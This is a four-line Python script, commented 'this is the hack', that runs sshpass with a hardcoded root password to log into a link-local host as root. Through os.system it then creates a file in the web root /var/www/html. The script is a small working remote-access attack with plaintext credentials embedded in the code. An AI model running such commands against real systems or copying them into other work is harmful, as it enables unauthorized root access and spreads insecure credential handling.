# this is the hack
import os
cmd = "sshpass -p 'goodyear123!@#' ssh -t root@169.254.236.100 sudo touch /var/www/html/hello.txt"
os.system(cmd)
